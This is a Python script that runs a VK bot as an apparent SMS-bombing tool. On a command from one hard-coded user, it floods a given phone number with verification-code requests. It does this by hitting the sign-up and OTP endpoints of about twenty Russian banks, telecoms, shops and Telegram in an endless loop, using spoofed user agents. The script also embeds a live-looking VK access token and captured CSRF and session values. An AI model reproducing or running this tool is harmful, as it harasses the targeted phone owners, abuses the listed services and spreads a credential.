try:
    import vk_api, threading, requests, os, random
    from vk_api.longpoll import VkLongPoll, VkEventType
    from vk_api.utils import get_random_id
    from fake_useragent import UserAgent

    def text1(arg):
        return arg.split()[1]


    def text2(arg):
        return arg.split()[2]


    def write_message(sender, message):
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id()})


    def spam(phone):
        print('j')
        phone = phone
        pulse = '+' + phone
        no7 = phone[1:] 
        masska1 = phone = '+7+(' + phone[1:4] + ')+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
        masska2 = phone[1:4] + '+' + phone[4:7] + '+' + phone[7:9] + '-' + phone[9:11]
        masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
        while range(5):
            ua = UserAgent()
            headers = {'User-Agent': ua.chrome}
            try:
                requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers)
            except:
                pass

            try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
                        data={"phone": "+" + phone}, headers=headers, timeout=5.05)
            except:pass

            try:requests.post("https://my.telegram.org/auth/send_password",
                        data={"phone": "+" + phone}, headers=headers, timeout=5.05)
            except:pass
            try:requests.post("https://apteka.magnit.ru/api/personal/auth/code/", 
                    data={'phone': phone}, headers=headers, timeout=5.05)
            except:pass
            try:
                requests.get('https://www.askona.ru/api/registration/sendcode?csrf_token=214a57c11e2703c3e6745989f1031bc5&contact[phone]='+phone, headers=headers)
            except:
                pass
            try:
                requests.post('https://www.technopark.ru/graphql/', json={"operationName":"AuthStepOne","variables":{"phone":no7,"token":"9ea9pcg7td0muk9piuhqhhqp26","cityId":"36966"},"query":"mutation AuthStepOne($phone: String!, $token: String!, $cityId: ID!) @access(token: $token) @city(id: $cityId) {\n  sendOTP(phone: $phone)\n}\n"}, headers=headers)
            except:
                pass
            try:
                requests.post('https://services.open.ru/anketa_credit/api/public/credit/cash/application/confirm-code?utm_source=yandex', json={'phone': phone}, headers=headers)
            except:
                pass
            try:
                requests.post('https://pik-broker.ru/api-react/userpanel-v1/signup', json={'name': 'Дмитрий', 'phone': phone}, headers=headers)
            except:
                pass
            try:
                requests.post('https://api.apteka.ru/Auth/Auth_Code?cityId=5e57803249af4c0001d64407', json={'phone': masska4, 'u': 'U'}, headers=headers)
            except:
                pass
            try:
                requests.post('https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token', data={'username': phone,
                    'client_id': 'broker_otp_guest2_web',
                    'grant_type': 'password'}, headers=headers)
            except:
                pass
            try:
                requests.post(
                    'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                    params={'msisdn': phone}, headers=headers)
            except:
                pass
            try:requests.post("https://login.mts.ru/amserver/UI/Login?service=login&srcsvc=sitemts&goto=https://moskva.mts.ru/json/auth/publicuser/afterlogin",
                    json= {
                    "login": masska3,
                    "IDToken1": no7,
                    "IDButton": "Submit",
                    "encoded": "false",
                    "loginURL": "?service=sitemts&goto=https%3A%2F%2Fmoskva.mts.ru%2Fjson%2Fauth%2Fpublicuser%2Fafterlogin",
                    "csrf.sign": "fee386083ef6b2ded9d9e2abebe2445ffee6750a32f501987d864a6b6aa619a7058e7f2ea0bfd3f3c0fafa9e34c0401071e07dfd620e9e7eeb8302205abe6ae4",
                    "csrf.ts": "1630205683640"  
                    }, headers=headers, timeout=5.05)
            except:pass

            try:
                requests.post('https://kokao.revoup.ru/v2/auth', json={'mobile_phone': phone}, headers=headers)
            except:
                pass
            try:
                requests.post('https://disk.megafon.ru/api/3/md_otp_tokens/', json={"phone": '+' + phone}, headers=headers)
            except:
                pass
            try:
                requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone,anonymRegistrationEnterPhone', data={"st.r.phone":"+"+phone}, headers=headers)
            except:
                pass

            try:requests.post("https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",
                    data={"phone": pulse}, headers=headers)
            except:pass
            try:requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/", headers=headers)
            except:pass
            try:requests.post("https://my.modulbank.ru/api/v2/auth/phone", data={"CellPhone": phone[1:]}, headers=headers)
            except:pass


    token = "00d1fe42cd35dcb46d965193a98f3ad926fbf061355e33bf2178993c91b745b5f7fd20e0d903521575be5"
    authorize = vk_api.VkApi(token=token)
    longpoll = VkLongPoll(authorize)
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW and event.to_me:
            reseived_message = event.text.lower()
            sender = event.user_id
            if sender == 685062634:
                if reseived_message == 'начать':
                    write_message(sender, "Работает!")
                    # ОТПРАВКА ЗАПРОСТА СЕРЕЗ ПОТОКИ 
                elif reseived_message[0:2] == '/l':
                    nomer = text1(reseived_message)
                    t = threading.Thread(target=spam, args=(nomer,))
                    t.start()
                    write_message(sender, 'Всё ок')

except:
    os.system('python bot.py')
